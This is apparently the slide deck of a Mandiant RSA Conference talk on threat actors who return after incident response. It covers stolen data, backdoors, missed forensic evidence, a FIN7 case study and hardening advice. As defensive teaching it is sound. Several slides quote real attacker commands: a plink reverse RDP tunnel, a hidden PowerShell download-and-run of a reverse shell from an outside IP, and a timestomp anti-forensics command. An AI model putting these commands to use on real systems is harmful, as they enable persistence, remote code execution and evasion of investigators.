SESSION ID: HTAW01 - 20599
Recapture of Glory: The Return of Persistent Threat Actors

Charles Carmakal
Senior Vice President Mandiant, a FireEye Company

Jibran Ilyas
Director Mandiant, a FireEye Company @jibranilyas

#RSAC

Introductions
Charles Carmakal
Senior Vice President & Strategic Services CTO
Based in Washington, DC
Leads a team of incident responders that has responded to over a thousand incidents
20+ years of experience with incident response and red teaming
Previously led the security consulting business at a Big 4 consulting firm
Bachelors and Masters from the University of Florida

#RSAC
Jibran Ilyas Director, Incident Response Based in Chicago, IL Leads a team of incident responders in US Central Region Speaker at DEFCON, BlackHat, Thotcon Adjunct Professor at Northwestern University Bachelors from DePaul and Masters from Northwestern University Chicago Crain's 40 under 40 (Class of 2017)

#RSAC
Agenda
Goals of this session State of the Hack Notable data theft during first intrusion Planted backdoors in first intrusion Missed analysis in first investigation Demos Apply the lessons Q&A
3

#RSAC
Goals of this Presentation
Goal 1: Show latest techniques that attackers employ Goal 2: Point out the data theft in first intrusion that aids in subsequent intrusions Goal 3: Point out what attackers do to set base and also what investigators may miss Goal 4: Show "evil" in action via live demos Goal 5: Provide strategic and tactical guidance to protect against targeted adversaries
4

#RSAC
State of the Hack

#RSAC
Once a Target, Always a Target
Threat actors attempted to regain access to 31% of our managed services clients within 12 months of being eradicated by Mandiant incident responders Source: M-Trends 2020
6

#RSAC
State of the Hack
Hands on keyboard operators Living off the land attacks Slow and steady attacks Hiding in plain sight Social engineering and well researched operations Attackers studying response efforts and adjusting Compromised networks used for attacks
7

#RSAC
What Adversaries Know
Humans are always going to be vulnerable Investigators may not have full visibility into the environment Investigation teams have constraints:
­ Budget ­ Bandwidth ­ Working hours
Security software coverage is never 100% and tamper protection isn't a norm on those solutions Changing tactics, techniques, and procedures (TTPs) can buy time for attackers
8

Evolving Threat Landscape

It's a "who," not a "what"
 There is a human at a keyboard
 Performing highly tailored and
customized attacks
 Often targeted at specific
organizations

Professional, organized and well funded
 Attackers escalate sophistication
of their tactics as needed
 They remain relentlessly
focused on their objective

#RSAC
If you kick them out, they may return
 They have specific objectives  Their goal can be long-term
occupation or short-term destruction
 Upon return, they use newer /
evolved tools and tactics to defeat the defense and detection

9

#RSAC
Example of Tool Evolution - Mimikatz

Use of Mimikatz in initial intrusion

Use of Mimikatz in second intrusion

Use of Mimikatz in third intrusion

Potential next tactic to be used by attackers?

10

Example ­ APT1 Reaction after Mandiant Report
Monday 2/18/2013 ­ Business as Usual
­ Report released at 10 PM EST
Tuesday 2/19/2013 ­ Action Plan Invoked
· Domains parked · WHOIS registry changed · Backdoor/tools removed · Staging/working directories cleared · New backdoors implanted
Overall Trends:
· Several days to retool · APT1 activity continued for a short period of time, but has not been
observed in years

#RSAC

#RSAC
Avenues of Return

Prior Knowledge
· Use knowledge from prior intrusions
· Passwords not changed for service accounts
· Passwords not changed for other accounts (e.g. passwords in password managers, network devices)

Backdoors
· Backdoors not identified during first incident
· Malware identified, but not removed from systems
· Malware reloaded through virtual machine snapshots or system backups
· Malware in gold images
· Malware in code repositories

Early Use of Exploits
· Apache Struts 2 (CVE-
2018-11776) · Citrix NetScaler ADC
(CVE-2019-19781) · Pulse Secure VPN
(CVE-2019-11510)

Supply Chain Attacks
· Exploiting trust relationships from third parties

#RSAC
Data Theft in Initial Intrusion

#RSAC
Reusable Data acquired in first attack
Active Directory database Password repositories and passwords stored in browsers Emails (email delegates / email forwarding) Organization charts Network diagrams and documentations Network configs (including VPN certs for users) Data from internal portals (e.g. SharePoint, Wiki, Jira) Internal reconnaissance data (especially VPNs from 3rd parties) Keystroke logs for targeted users and systems
14

#RSAC
Planted backdoors in first targeted breach

#RSAC
Setting up base for future attacks
Remote Desktop tunneling Web shells on servers accessible from the Internet Scheduled tasks to be invoked at future time Golden ticket Variants in backdoors
16

#RSAC
RDP Tunneling Accomplished via plink command
­ plink.exe <users>@<IP or domain> -pw <password> -P 22 -2 -4 -T -N -C -R 12345:127.0.0.1:3389
On the RDP application on the C2 server, we type "127.0.0.1:12345" to gain access to RDP host behind an enterprise firewall
17

#RSAC
Web Shell Example
18

#RSAC
Scheduled Task Example
secupdate.bat placed in C:\Windows\Security\Audit folder Contents of file as follows:
­ start powershell -ep bypass -nop -w hidden -noni -comman "IEX (New-Object Net.WebClient).DownloadString('http://199.217.114[.]2xx:80/1.ps1')"
Invoked every Saturday at 1:55am via Task Scheduler 1.ps1 was a reverse shell
19

#RSAC
Missed Analysis in first investigation

#RSAC
Common Mistakes in IR and Red Team Exercises

Incident Response
· Organizations typically assume a linear compromise
· May potentially miss a second "patient zero" or alternate attack paths
· Important to examine the entire enterprise for evidence of compromise for many types of intrusions
· Attack path may identify multiple attack paths

Red Teaming
· Red teams often take a path of least resistance to meet client objectives
· Remediation is usually focused on the specific vulnerabilities identified
· Multiple attack paths and vulnerabilities likely exist

21

Initial Malicious Email

#RSAC
Phishing Campaigns Compromised Hosts Accessed Hosts Hosts with NonTargeted Malware

Lateral Movement

#RSAC
Phishing Campaigns Compromised Hosts Accessed Hosts Hosts with NonTargeted Malware

#RSAC
Lateral Movement #2 ­ Separate Email
Phishing Campaigns Compromised Hosts Accessed Hosts Hosts with NonTargeted Malware

#RSAC
Unrelated Non-targeted Malware Systems
Phishing Campaigns Compromised Hosts Accessed Hosts Hosts with NonTargeted Malware

#RSAC
Investigations are Iterative
26

#RSAC
Potentially missed data points
Routers, firewalls, switches, and other network gear Systems not reporting to their central command Legacy remote access portals with single factor authentication Legit remote access software Linux servers (SSH daemon, PAM module) Time stomped files Sleeper backdoors Malware with search order hijacking Domain fronting File transfer via Google Drive or OneDrive mapped as network drive
27

#RSAC
Time Stomping Example
Goal ­ Hide true time of the installation of key tools to stop investigators looking into that timeframe It only takes one timestamp in an investigation to take your analysis to a new direction of finding evil Command
­ timestomp.exe cll.vbs -f C:\Windows\system32\cmd.exe
­ Copies timestamps of cmd.exe and assigns to cll.vbs
­ Doesn't change $FN attribute of $MFT
28

Sleeper Backdoor Example
Goal ­ hide C&C server and C&C network traffic when attackers do not need to communicate
Mechanism ­ attackers change DNS records to point to 127.0.0.1 (loop back address)

#RSAC
Output of "ipconfig /displaydns" command

TCPView screenshot 29

#RSAC
Linux Servers Analysis
Linux servers not included in scope because:
­ Missed due to belief that "attackers infected only Windows since malware they used would only work on Windows"
­ Many security tools offer Windows only version, hence security staff loses visibility on Linux
­ Lack of people in team with Linux skills
As a result, backdoors on Linux or data exfiltration happening via Linux has a high chance of being missed in the investigation
30

#RSAC
Early use of Exploits

#RSAC
Examples of Exploits Used Shortly after Disclosure
Heartbleed (CVE-2014-0160) Apache Struts 2 (CVE-2018-11776) Citrix NetScaler ADC (CVE-2019-19781) Pulse Secure VPN (CVE-2019-11510)
32

#RSAC
Case Study: Aggressive Attacks Against a Hospitality Organization

#RSAC
First Intrusion (FIN7)
Goal: steal payment card data
Intrusion detected due to the use of a zero-day local privilege escalation in Windows (detected by FireEye network sensor)
FIN7 successfully stole payment card data
Conducted an enterprise incident response engagement
Successfully eradicated FIN7
Organization deployed new security tools (email antimalware solution, endpoint EDR, etc.), hired more people, and built more security processes

#RSAC
Second Intrusion Attempt (FIN7)
Goal: steal payment card data
FIN7 called restaurant managers to complain about food poisoning
Said they would send a complaint over email
Malicious documents were not delivered (blocked by mail gateway)
FIN7 had to tweak their malware to get through the mail gateway

#RSAC
Third Intrusion Attempt (FIN7)
Developed an evasion to trick the mail gateway into thinking the document was benign Malicious emails were delivered FIN7 called multiple restaurant managers and asked them to enable macros on the document FIN7 compromised multiple endpoints and servers (detected by EDR) FIN7 was caught and eradicated before they got to systems with payment card data

#RSAC
Fourth Intrusion Attempt (FIN7)
Bypassed email gateway by delivering email directly to Office 365 from another Office 365 tenant
Malicious emails were delivered
FIN7 called different restaurants and coached victims into double clicking on OLE objects in Word documents
Second stage payload downloaded by blocked by EDR on patient zero

#RSAC
Supply Chain Attacks

#RSAC
Live Demos
1. DLL Search Order Hijacking 2. RDP Tunneling

#RSAC
Apply the lessons learned

#RSAC
High Level Recommendations
Apply the rule of "Can you track access (normal/suspect) on all data or systems that you deem sensitive" to increase visibility
Log Monitoring standards shall be improved
­ Tiered Model where critical machines' alerts are handled by the best resources and have low tolerance on invoking Incident Response
­ Hire experienced people to do monitoring
Invest in a Threat Hunting Program
­ Analysis on data from all nodes combined to check for outliers (e.g. DLL loaded on one system only)
­ Analysis on legit remote access software for unauthorized use ­ Analysis on legit data backups (Box, Dropbox, OneDrive) for unauthorized use
41

#RSAC
Tactical Advice for Major Avenues
Utilize Restricted Admin Mode for RDP connections
­ This will limit the in-memory exposure of administrative credentials on a destination endpoint accessed using the RDP
­ Group Policy
Computer Configuration > System > Credential Delegation > Restrict delegation of credentials to remote servers Require Restrict Admin > set to Enabled
Disable WDigest to avoid plaintext password exposure Enable command line logging to track parameters of for cmd, mshta, rundll32, powershell, cscript, wscript, psexec, etc.
42

#RSAC
Tactical advice for blocking Macros
Block macros from running in Office files downloaded from the Internet
Block program executions from the %LocalAppData% and %AppData% folder Force extensions commonly used by scripts to open up in Notepad rather than Windows Script Host or Internet Explorer.
43

#RSAC
Advice around 2FA
Two-factor anything accessible from the internet
­ VPN, Citrix, OWA, O365
Don't use soft-certificates
­ Identified evidence of attacker stealing certs and using to access VPN
Ensure your process takes into account stolen credentials
­ Attacker registering their phones to authenticate using 2FA!
Review policies around 2FA by-pass codes and OTPs
44

#RSAC
Q & A

